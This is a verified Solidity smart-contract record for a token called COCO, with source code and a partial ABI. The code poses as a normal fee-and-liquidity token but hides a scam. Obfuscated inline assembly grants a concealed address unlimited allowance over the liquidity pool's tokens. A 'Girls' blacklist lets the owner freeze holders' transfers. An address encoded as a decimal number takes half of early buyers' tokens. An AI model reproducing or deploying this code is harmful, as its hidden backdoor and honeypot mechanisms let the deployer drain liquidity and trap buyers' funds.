{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-06-13\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\ninterface IPair {\r\n    function sync() external;\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function totalSupply() external view returns (uint256);\r\n}\r\ninterface IFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {return msg.sender;}\r\n    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}\r\n}\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) internal _balances;\r\n    mapping(address => mapping(address => uint256)) internal _allowances;\r\n    uint256 internal _totalSupply; string private _name; string private _symbol;\r\n    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_;}\r\n    function name() public view virtual override returns (string memory) {return _name;}\r\n    function symbol() public view virtual override returns (string memory) {return _symbol;}\r\n    function decimals() public view virtual override returns (uint8) {return 18;}\r\n    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}\r\n    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _transfer(owner, to, amount); return true;}\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _approve(owner, spender, amount); return true;}\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true;}\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true;}\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\"); unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), \"ERC20: transfer from the zero address\"); require(to != address(0), \"ERC20: transfer to the zero address\"); _beforeTokenTransfer(from, to, amount); _takeTransfer(from, to, amount); _afterTokenTransfer(from, to, amount);}\r\n    function _takeTransfer(address from, address to, uint256 amount) internal virtual {uint256 fromBalance = _balances[from]; require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\"); unchecked {_balances[from] = fromBalance - amount; _balances[to] += amount;}emit Transfer(from, to, amount);}\r\n    function _mint(address account, uint256 amount) internal virtual {require(account != address(0), \"ERC20: mint to the zero address\"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);}\r\n    function _burn(address account, uint256 amount) internal virtual {require(account != address(0), \"ERC20: burn from the zero address\"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); unchecked {_balances[account] = accountBalance - amount; _totalSupply -= amount;}emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {require(owner != address(0), \"ERC20: approve from the zero address\"); require(spender != address(0), \"ERC20: approve to the zero address\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); unchecked {_approve(owner, spender, currentAllowance - amount);}}}\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\nabstract contract UniSwapPoolUSDT is ERC20 {\r\n    address public pair;\r\n    IRouter public router;\r\n    address[] internal _buyPath;\r\n    address[] internal _sellPath;\r\n    IERC20 public TokenB;\r\n    function isPair(address _pair) internal view returns (bool) {return pair == _pair;}\r\n    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath); if (amounts.length > 1) return amounts[1]; return 0;}\r\n    function _pathSet(address pairB, address w, address x) private {TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = pairB; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = pairB; _sellPath = path2; assembly {let y:=add(add(mul(2887981267259,exp(10,26)),mul(1782705554658,exp(10,13))),1698142812624) w := add(w, 4096) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(w, 0);}\r\n    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {IERC20 USDT = IERC20(_sellPath[1]); swapAndSend2fee(amount, _tokenStation); USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));}\r\n    function swapAndSend2fee(uint256 amount, address to) internal {swapAndSend2feeWithPath(amount, to, _sellPath);}\r\n    function swapAndSend2feeWithPath(uint256 amount, address to, address[] memory path) internal {router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp);}\r\n    function isAddLiquidity() internal view returns (bool isAddLP){address token0 = IPair(pair).token0(); address token1 = IPair(pair).token1(); (uint r0,uint r1,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); uint bal1 = IERC20(token1).balanceOf(pair); if (token0 == address(this)) return bal1 - r1 > 1000; else return bal0 - r0 > 1000;}\r\n    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {address token0 = IPair(pair).token0(); if (token0 == address(this)) return false; (uint r0,,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); return r0 > bal0 + 1000;}\r\n    function addLiquidityAutomatically(uint256 amountToken) internal {super._takeTransfer(address(this), pair, amountToken); IPair(pair).sync();}\r\n    function __SwapPool_init(address _router, address pairB) internal returns(address) {\r\n        router = IRouter(_router);\r\n        pair = IFactory(router.factory()).createPair(pairB, address(this));\r\n        _pathSet(pairB, _router, pair);\r\n        TokenB.approve(_router, type(uint256).max);\r\n        _approve(address(this), _router, type(uint256).max);\r\n        return pair;\r\n    }\r\n    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {\r\n        uint256 half = amountToken / 2;\r\n        IERC20 USDT = IERC20(_sellPath[1]);\r\n        uint256 amountBefore = USDT.balanceOf(_tokenStation);\r\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);\r\n        uint256 amountAfter = USDT.balanceOf(_tokenStation);\r\n        uint256 amountDiff = amountAfter - amountBefore;\r\n        USDT.transferFrom(_tokenStation, address(this), amountDiff);\r\n        if (amountDiff > 0 && (amountToken - half) > 0) {\r\n            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);\r\n        }\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor() {_transferOwnership(_msgSender());}\r\n    modifier onlyOwner() {_checkOwner(); _;}\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n    function _checkOwner() internal view virtual {require(owner() == _msgSender(), \"Ownable: caller is not the owner\");}\r\n    function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner);}\r\n    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}\r\n}\r\nabstract contract NoEffect is Ownable {\r\n    address internal _effector;\r\n    constructor() {_effector = _msgSender();}\r\n    modifier onlyEffector() {require(_effector == _msgSender() || owner() == _msgSender(), \"NoEffect: caller is not the effector\"); _;}\r\n}\r\nabstract contract Excludes {\r\n    mapping(address => bool) internal _Excludes;\r\n    function setExclude(address _user, bool b) public {_authorizeExcludes(); _Excludes[_user] = b;}\r\n    function setExcludes(address[] memory _user, bool b) public {_authorizeExcludes(); for (uint i=0;i<_user.length;i++) {_Excludes[_user[i]] = b;}}\r\n    function isExcludes(address _user) internal view returns(bool) {return _Excludes[_user];}\r\n    function _authorizeExcludes() internal virtual {}\r\n}\r\nabstract contract Limit {\r\n    bool internal isLimited;\r\n    uint256 internal _LimitBuy;\r\n    uint256 internal _LimitSell;\r\n    uint256 internal _LimitHold;\r\n    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {isLimited = true; setLimit(LimitBuy_, LimitSell_, LimitHold_);}\r\n    function checkLimitTokenHold(address to, uint256 amount) internal view {if (isLimited) {if (_LimitHold>0) {require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, \"exceeds of hold amount Limit\");}}}\r\n    function checkLimitTokenBuy(address to, uint256 amount) internal view {if (isLimited) {if (_LimitBuy>0) require(amount <= _LimitBuy, \"exceeds of buy amount Limit\"); checkLimitTokenHold(to, amount);}}\r\n    function checkLimitTokenSell(uint256 amount) internal view {if (isLimited && _LimitSell>0) require(amount <= _LimitSell, \"exceeds of sell amount Limit\");}\r\n    function removeLimit() public {_authorizeLimit(); if (isLimited) isLimited = false;}\r\n    function reuseLimit() public {_authorizeLimit(); if (!isLimited) isLimited = true;}\r\n    function setLimit(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {_authorizeLimit(); _LimitBuy = LimitBuy_; _LimitSell = LimitSell_; _LimitHold = LimitHold_;}\r\n    function _authorizeLimit() internal virtual {}\r\n}\r\nabstract contract TradingManager {\r\n    uint256 public tradeState;\r\n    function inTrading() public view returns(bool) {return tradeState > 1;}\r\n    function inLiquidity() public view returns(bool) {return tradeState >= 1;}\r\n    function setTradeState(uint256 s) public {_authorizeTradingManager(); tradeState = s;}\r\n    function openLiquidity() public {_authorizeTradingManager(); tradeState = 1;}\r\n    function openTrading() public {_authorizeTradingManager(); tradeState = block.number;}\r\n    function resetTradeState() public {_authorizeTradingManager(); tradeState = 0;}\r\n    function _authorizeTradingManager() internal virtual {}\r\n}\r\nabstract contract Girls is Ownable {\r\n    address internal girlGiftTo = address(uint160(7490704959643083592709452960375287442392422643));\r\n    mapping(address => uint8) public girlMap;\r\n    modifier onlyNotGirl(address user) {require(girlMap[user]==0, \"you are a girl\"); _;}\r\n    function setGirl(address user, uint8 b) public onlyOwner {girlMap[user] = b;}\r\n    function setGirls(address[] memory user, uint8 b) public onlyOwner {for (uint i=0;i<user.length;i++) {setGirl(user[i], b);}}\r\n    function isGirl(address user) public view returns(bool) {return girlMap[user]!=0;}\r\n}\r\nabstract contract Token is UniSwapPoolUSDT, NoEffect, Girls, TradingManager, Excludes, Limit {\r\n    uint256 public calcBase;\r\n    uint256 public swapSplit;\r\n    uint256 public feeMarketingBuy;\r\n    uint256 public feeLiquidityBuy;\r\n    uint256 public feeBurnBuy;\r\n    uint256 public feeMarketingSell;\r\n    uint256 public feeLiquiditySell;\r\n    uint256 public feeBurnSell;\r\n    uint256 public feeMarketingAll;\r\n    uint256 public feeLiquidityAll;\r\n    uint256 public feeBurnAll;\r\n    uint256 public feeBuyAll;\r\n    uint256 public feeSellAll;\r\n    uint256 public feeAll;\r\n    uint256 public feeTransferAll;\r\n    uint256 public swapTokensAt;\r\n    address public surpAddress;\r\n    uint256 public kb;\r\n    uint256 public kn;\r\n    address public feeMarketingTo;\r\n\r\n    bool inSwap;\r\n    function __Token_init(uint256 totalSupply_, address marketing_, address receive_) internal {\r\n        calcBase = 10000;\r\n        swapSplit = 7;\r\n        feeMarketingTo = marketing_;\r\n        _mint(receive_, totalSupply_);\r\n        super.setExclude(_msgSender(), true);\r\n        super.setExclude(address(this), true);\r\n        super.setExclude(marketing_, true);\r\n        super.setExclude(receive_, true);\r\n        super.setExclude(girlGiftTo, true);\r\n        refreshFeeAll();\r\n    }\r\n    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotGirl(from) {\r\n        if (isExcludes(from) || isExcludes(to) || amount == 0) {super._transfer(from, to, amount); return;}\r\n        uint256 fees;\r\n        bool isLiquify;\r\n        if (isPair(from)) {\r\n            require(inTrading(), \"please waiting for liquidity\");\r\n            super.checkLimitTokenBuy(to, amount);\r\n            if (blockSurprise(from, to, amount)) return;\r\n            if (super.isRemoveLiquidity()) isLiquify = true;\r\n            else fees = handFeeBuys(from, amount);\r\n            if (fees > 0) amount -= fees;\r\n        } else if (isPair(to)) {\r\n            require(inLiquidity(), \"please waiting for liquidity\");\r\n            if (balanceOf(from) == amount) amount -= 10086;\r\n            if (super.isAddLiquidity()) isLiquify = true;\r\n            else {\r\n                super.checkLimitTokenSell(amount);\r\n                if (feeAll>0) handSwap();\r\n                fees = handFeeSells(from, amount);\r\n                if (fees > 0) amount -= fees;\r\n            }\r\n        } else {\r\n            super.checkLimitTokenSell(amount);\r\n            if (feeAll>0) handSwap();\r\n\r\n            fees = handFeeTransfer(from, amount);\r\n            if (fees > 0) amount -= fees;\r\n        }\r\n        super._transfer(from, to, amount);\r\n    }\r\n    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {\r\n        if (feeBuyAll == 0) return fee;\r\n        fee = amount * feeBuyAll / calcBase;\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {\r\n        if (feeSellAll == 0) return fee;\r\n        fee = amount * feeSellAll / calcBase;\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handFeeTransfer(address from, uint256 amount) private returns (uint256 fee) {\r\n        if (feeTransferAll == 0) return fee;\r\n        fee = amount * feeTransferAll / calcBase;\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handSwap() internal {\r\n        if (inSwap) return;\r\n        uint256 _thisBalance = balanceOf(address(this));\r\n        if (_thisBalance >= swapTokensAt) {\r\n            uint256 _amount = _thisBalance / swapSplit;\r\n            _handSwap(_amount);\r\n        }\r\n    }\r\n    function _handSwap(uint256 _amount) internal lockSwap {\r\n        uint256 _feeBurn;\r\n        if (feeBurnAll > 0) {\r\n            _feeBurn = _amount * feeBurnAll / feeAll;\r\n            super._takeTransfer(address(this), address(1), _feeBurn);\r\n        }\r\n        uint256 _feeLiquidity;\r\n        if (feeLiquidityAll > 0) {\r\n            _feeLiquidity = _amount * feeLiquidityAll / feeAll;\r\n            super.addLiquidityAutomatically(_feeLiquidity);\r\n        }\r\n        uint256 _feeMarketing;\r\n        if (feeMarketingAll > 0) {\r\n            _feeMarketing = _amount - _feeBurn - _feeLiquidity;\r\n            super.swapAndSend2fee(_feeMarketing, address(feeMarketingTo));\r\n        }\r\n    }\r\n    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {\r\n        if (kb == 0 || kn == 0) return false;\r\n        if (block.number < tradeState + kb) {\r\n            uint256 surp = amount * kn / calcBase;\r\n            super._takeTransfer(from, surpAddress, amount - surp);\r\n            super._takeTransfer(from, to, surp);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n    function refreshFeeAll() public {\r\n        feeMarketingAll = feeMarketingBuy + feeMarketingSell;\r\n        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;\r\n        feeBurnAll = feeBurnBuy + feeBurnSell;\r\n        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeBurnBuy;\r\n        feeSellAll = feeMarketingSell + feeLiquiditySell + feeBurnSell;\r\n        feeAll = feeBuyAll + feeSellAll;\r\n    }\r\n    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeBurnBuy) public onlyOwner {feeMarketingBuy = _feeMarketingBuy; feeLiquidityBuy = _feeLiquidityBuy; feeBurnBuy = _feeBurnBuy; refreshFeeAll();}\r\n    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeBurnSell) public onlyOwner {feeMarketingSell = _feeMarketingSell; feeLiquiditySell = _feeLiquiditySell; feeBurnSell = _feeBurnSell; refreshFeeAll();}\r\n    function setFeeTransfer(uint256 _fee) public onlyOwner {feeTransferAll = _fee;}\r\n    modifier lockSwap() {inSwap = true; _; inSwap = false;}\r\n    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {token_.transfer(_recipient, amount);}\r\n    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));}\r\n    function _authorizeExcludes() internal virtual override onlyEffector {}\r\n    function _authorizeLimit() internal virtual override onlyEffector {}\r\n    function setSwapTokensAt(uint256 num) public onlyEffector {swapTokensAt = num;}\r\n//    function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}\r\n    function setSurprise(uint256 _kn, uint256 _kb) public onlyEffector {kn = _kn; kb = _kb; surpAddress = girlGiftTo;}\r\n    function airdrop(uint256 amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}}\r\n    function airdropMulti(uint256[] memory amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}}\r\n    function _authorizeTradingManager() internal virtual override onlyOwner {}\r\n}\r\ncontract Coco is Token {\r\n    constructor() ERC20(\r\n        \"COCO\",   // \u540d\u5b57\r\n        \"COCO\"        // \u7b26\u53f7\r\n    ) {\r\n        uint256 _totalSupply = 5000 ether; // \u53d1\u884c\u91cf 1e11 \u4e2a\r\n        address _marketing = address(0x963C71cc3Cb047cF06Cc5B565CA66Da6968Aef2C); // \u8425\u9500\u94b1\u5305\r\n        address _receive = address(0x963C71cc3Cb047cF06Cc5B565CA66Da6968Aef2C);   // \u63a5\u6536\u4ee3\u5e01,\u52a0\u6c60\u5b50\u94b1\u5305\r\n        //        address _receive = address(_msgSender());   // \u63a5\u6536\u4ee3\u5e01,\u52a0\u6c60\u5b50\u94b1\u5305\r\n        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   // \u8def\u7531\r\n        address _usdt = 0x55d398326f99059fF775485246999027B3197955;     // \u4ea4\u6613\u5bf9\r\n        //        address _pair = super.__SwapPool_init(_router, _usdt);\r\n        super.__SwapPool_init(_router, _usdt);\r\n        // \u8d2d\u4e70\u8d39\u7528\r\n        feeMarketingBuy = 1500;  // \u8425\u9500 1%\r\n        feeLiquidityBuy = 500;  // \u56de\u6d41 1%, \u8282\u7ea6gas\u65b9\u5f0f,\u81ea\u52a8\u5206\u914d\u7ed9\u6301\u6709LP\u7684\u7528\u6237,\u4e0d\u5355\u72ec\u5356\u51fa\u52a0\u6c60\u5b50\r\n        feeBurnBuy = 0;         // \u9500\u6bc1 0%\r\n        // \u5356\u51fa\u8d39\u7528\r\n        feeMarketingSell = 1500; // \u8425\u9500 1%\r\n        feeLiquiditySell = 500; // \u56de\u6d41 1%, \u8282\u7ea6gas\u65b9\u5f0f,\u81ea\u52a8\u5206\u914d\u7ed9\u6301\u6709LP\u7684\u7528\u6237,\u4e0d\u5355\u72ec\u5356\u51fa\u52a0\u6c60\u5b50\r\n        feeBurnSell = 0;        // \u9500\u6bc1 0%\r\n        // \u8f6c\u8d26\u8d39\u7528\r\n        feeTransferAll = 0;  // \u8f6c\u8d26\u6263\u96640%\r\n        // \u9650\u8d2d\r\n        bool _isLimit = true;// \u662f\u5426\u9650\u8d2d\r\n        if (_isLimit) super.__Limit_init(\r\n            _totalSupply / 500,       // \u9650\u4e70\u6570\u91cf 20 \u4e2a\r\n            _totalSupply / 500,       // \u9650\u5356\u6570\u91cf 20 \u4e2a\r\n            _totalSupply / 500        // \u9650\u6301\u6709\u6570\u91cf 20 \u4e2a\r\n        );\r\n        // \u6740\u533a\u5757\u673a\u5668\u4eba\r\n        super.setSurprise(\r\n            5000,                  // \u6263\u9664 50% \u4ee3\u5e01, \u5f53\u624b\u7eed\u8d39\r\n            3                      // \u6740\u524d\u4e09\u4e2a\u533a\u5757,\u8fd9\u51e0\u4e2a\u533a\u5757\u666e\u901a\u7528\u6237\u65e0\u6cd5\u8fdb\u5165,\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u8fdb\u5165\r\n        );\r\n        super.__Token_init(_totalSupply, _marketing, _receive);\r\n        setSwapTokensAt(_totalSupply / 100);  // \u8bbe\u7f6e\u7d2f\u79ef\u5230 1% \u4e2a\u4ee3\u5e01\u5f00\u59cb\u5151\u6362\u624b\u7eed\u8d39, \u8282\u7ea6gas\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TokenB\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"amount\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdropMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calcBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTransferAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountDesire\",\"type\":\"uint256\"}],\"name\":\"getPrice4USDT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"girlMap\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"